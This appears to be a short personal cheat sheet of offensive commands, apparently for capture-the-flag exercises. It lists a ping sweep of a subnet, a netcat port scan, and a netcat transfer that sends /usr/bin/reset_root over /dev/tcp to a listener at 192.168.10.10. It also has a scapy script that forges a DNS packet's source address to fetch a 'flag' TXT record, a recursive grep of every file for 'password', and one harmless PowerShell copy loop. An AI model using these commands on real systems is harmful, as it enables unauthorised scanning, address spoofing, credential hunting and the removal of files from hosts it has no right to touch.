# check ping
for host in {1..154}; do ping -c1 192.168.1.$host | grep -B1 "1 received" | grep "statistics" | cut -d " " -f2; done | tee hosts.txt
# check port 
nc -zv -w 1 <host> 20-1023
# transfer file via netcat
nc -lvnp 3333 > reset_root
cat /usr/bin/reset_root > /dev/tcp/192.168.10.10 3333
# IP spoofing
```
from scapy.all import *

def send_spoofed_dns_request():
    # Crafting the DNS request packet
    dns_request = (
        IP(src="10.0.2.15", dst="129.153.36.153") /
        UDP(sport=53, dport=53) /
        DNS(rd=1, qd=DNSQR(qname="flag", qtype="TXT"))
    )

    # Sending the packet and waiting for a response
    response = sr1(dns_request, timeout=5, verbose=0)
    
    # Check if there's a response and print it
    if response and response.haslayer(DNSRR):
        print("Response received:", response[DNSRR].rdata)
    else:
        print("No response received.")

send_spoofed_dns_request()

```
# đọc và grep tất cả các file 
find . -type f -exec cat {} + |grep -a 'password'
# powershell
 Get-ChildItem -Path ".\a\" -Filter "*.png" -Recurse | ForEach-Object { Copy-Item $_.FullName -Destination (".\b\" + $_.Directory.Name + "_" + $_.Name) }



